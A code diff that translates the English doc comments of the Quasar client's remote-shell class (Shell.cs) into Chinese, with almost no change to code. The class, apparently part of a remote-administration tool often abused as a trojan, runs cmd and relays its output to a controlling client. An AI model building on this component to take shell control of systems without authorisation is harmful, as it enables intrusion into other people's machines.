@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Networking;
+﻿﻿using Quasar.Client.Networking;
 using Quasar.Common.Messages;
 using System;
 using System.Diagnostics;
@@ -10,59 +10,59 @@ using System.Threading;
 namespace Quasar.Client.IO
 {
     /// <summary>
-    /// This class manages a remote shell session.
+    /// 这个类管理远程shell会话。
     /// </summary>
     public class Shell : IDisposable
     {
         /// <summary>
-        /// The process of the command-line (cmd).
+        /// 命令行(cmd)的进程。
         /// </summary>
         private Process _prc;
 
         /// <summary>
-        /// Decides if we should still read from the output.
+        /// 决定我们是否应该继续从输出中读取。
         /// <remarks>
-        /// Detects unexpected closing of the shell.
+        /// 检测shell的意外关闭。
         /// </remarks>
         /// </summary>
         private bool _read;
 
         /// <summary>
-        /// The lock object for the read variable.
+        /// 读取变量的锁对象。
         /// </summary>
         private readonly object _readLock = new object();
 
         /// <summary>
-        /// The lock object for the StreamReader.
+        /// StreamReader的锁对象。
         /// </summary>
         private readonly object _readStreamLock = new object();
 
         /// <summary>
-        /// The current console encoding.
+        /// 当前控制台编码。
         /// </summary>
         private Encoding _encoding;
 
         /// <summary>
-        /// Redirects commands to the standard input stream of the console with the correct encoding.
+        /// 使用正确的编码将命令重定向到控制台的标准输入流。
         /// </summary>
         private StreamWriter _inputWriter;
 
         /// <summary>
-        /// The client to sends responses to.
+        /// 发送响应的客户端。
         /// </summary>
         private readonly QuasarClient _client;
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="Shell"/> class using a given client.
+        /// 使用给定客户端初始化 <see cref="Shell"/> 类的新实例。
         /// </summary>
-        /// <param name="client">The client to send shell responses to.</param>
+        /// <param name="client">发送shell响应的客户端。</param>
         public Shell(QuasarClient client)
         {
             _client = client;
         }
 
         /// <summary>
-        /// Creates a new session of the shell.
+        /// 创建shell的新会话。
         /// </summary>
         private void CreateSession()
         {
@@ -100,7 +100,7 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Starts the redirection of input and output.
+        /// 开始重定向输入和输出。
         /// </summary>
         private void RedirectIO()
         {
@@ -110,11 +110,11 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Reads the output from the stream.
+        /// 从流中读取输出。
         /// </summary>
-        /// <param name="firstCharRead">The first read char.</param>
-        /// <param name="streamReader">The StreamReader to read from.</param>
-        /// <param name="isError">True if reading from the error-stream, else False.</param>
+        /// <param name="firstCharRead">第一个读取的字符。</param>
+        /// <param name="streamReader">要读取的StreamReader。</param>
+        /// <param name="isError">如果从错误流读取则为True，否则为False。</param>
         private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
         {
             lock (_readStreamLock)
@@ -141,10 +141,10 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Sends the read output to the Client.
+        /// 将读取的输出发送到客户端。
         /// </summary>
-        /// <param name="textBuffer">Contains the contents of the output.</param>
-        /// <param name="isError">True if reading from the error-stream, else False.</param>
+        /// <param name="textBuffer">包含输出的内容。</param>
+        /// <param name="isError">如果从错误流读取则为True，否则为False。</param>
         private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
         {
             if (textBuffer.Length == 0) return;
@@ -159,7 +159,7 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Reads from the standard output-stream.
+        /// 从标准输出流读取。
         /// </summary>
         private void RedirectStandardOutput()
         {
@@ -202,7 +202,7 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Reads from the standard error-stream.
+        /// 从标准错误流读取。
         /// </summary>
         private void RedirectStandardError()
         {
@@ -245,10 +245,10 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Executes a shell command.
+        /// 执行shell命令。
         /// </summary>
-        /// <param name="command">The command to execute.</param>
-        /// <returns>False if execution failed, else True.</returns>
+        /// <param name="command">要执行的命令。</param>
+        /// <returns>如果执行失败则返回False，否则返回True。</returns>
         public bool ExecuteCommand(string command)
         {
             if (_prc == null || _prc.HasExited)
@@ -275,11 +275,11 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Converts the encoding of an input string to UTF-8 format.
+        /// 将输入字符串的编码转换为UTF-8格式。
         /// </summary>
-        /// <param name="sourceEncoding">The source encoding of the input string.</param>
-        /// <param name="input">The input string.</param>
-        /// <returns>The input string in UTF-8 format.</returns>
+        /// <param name="sourceEncoding">输入字符串的源编码。</param>
+        /// <param name="input">输入字符串。</param>
+        /// <returns>UTF-8格式的输入字符串。</returns>
         private string ConvertEncoding(Encoding sourceEncoding, string input)
         {
             var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
@@ -287,7 +287,7 @@ namespace Quasar.Client.IO
         }
 
         /// <summary>
-        /// Releases all resources used by this class.
+        /// 释放此类使用的所有资源。
         /// </summary>
         public void Dispose()
         {
